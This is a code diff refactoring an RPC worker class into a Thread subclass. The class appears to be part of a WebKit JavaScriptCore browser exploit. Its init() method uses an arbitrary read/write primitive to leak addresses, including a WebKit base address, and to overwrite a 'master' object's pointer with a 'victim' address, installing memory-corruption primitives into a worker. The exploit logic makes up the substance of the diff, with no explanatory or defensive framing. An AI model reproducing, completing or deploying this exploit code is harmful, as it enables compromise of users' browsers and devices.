@@ -1,7 +1,8 @@
 //#region Classes
-class RPCWorker {
+class Thread extends Worker {
   constructor(name) {
-    if (typeof name !== "string") {
+    super('src/worker.js');
+    if (typeof name !== 'string') {
       throw new Error(`${name} not a valid name !!`);
     }
 
@@ -9,13 +10,12 @@ class RPCWorker {
     this.name = name;
     this.transfer = [];
     this.promises = new Map();
-    this.worker = new Worker("src/worker.js");
-
-    this.worker.onmessage = (e) => {
+    this.onmessage = (e) => {
       const { id, type, value } = e.data || {};
 
-      if (type === "log") {
-        logger.log(value);
+      if (type === 'log') {
+        const { prefix, msg } = value;
+        logger.log(`${prefix} [${this.name}]`, msg);
         return;
       }
 
@@ -25,39 +25,34 @@ class RPCWorker {
       this.promises.delete(id);
 
       switch (type) {
-        case "ret":
+        case 'ret':
           promise.resolve(value);
           break;
-        case "err":
+        case 'err':
           promise.reject(value);
+
+          for (const pending of this.promises.values()) {
+            pending.reject(value);
+          }
+
+          this.promises.clear();
           break;
       }
     };
   }
 
-  terminate() {
-    this.worker.terminate();
-  }
-
-  execute(name, ...args) {
-    return new Promise((resolve, reject) => {
-      const id = this.id++;
-
-      this.promises.set(id, { resolve, reject });
-
-      this.worker.postMessage({ id, name, args }, this.transfer);
-    });
-  }
-
+  // receive worker transferred marker_arr ArrayBuffer to the main thread
+  // we use main arw to traverse worker JSC and install arw into worker
+  // property order in butterfly is reverse of assignment order
   async init() {
-    logger.debug(`initializing ${this.name}...`);
+    logger.info(`Initializing thread ${this.name}...`);
 
-    const marker_arr = await this.execute("init", this.name);
+    const marker_arr = await this.execute('init');
 
     const marker_buf_data = marker_arr.buffer.data();
     logger.debug(`marker_buf_data: ${marker_buf_data}`);
 
-    const marker_storage_addr = arw.view(marker_buf_data).getBInt(constants.marker_storage, true);
+    const marker_storage_addr = arw.view(marker_buf_data).getBInt(0x10, true);
     logger.debug(`marker_storage_addr: ${marker_storage_addr}`);
 
     const marker_addr = arw.view(marker_storage_addr).getBInt(8, true);
@@ -80,9 +75,19 @@ class RPCWorker {
 
     arw.view(master_addr).setBInt(0x10, victim_addr, true);
 
-    await this.execute("setup", leak_addr, webkit_base);
+    await this.execute('setup', leak_addr);
 
-    logger.debug(`${this.name} initialized !!`);
+    logger.info(`Thread ${this.name} initialized !!`);
+  }
+
+  execute(name, ...args) {
+    return new Promise((resolve, reject) => {
+      const id = this.id++;
+
+      this.promises.set(id, { resolve, reject });
+
+      this.postMessage({ id, name, args }, this.transfer);
+    });
   }
 }
 //#endregion
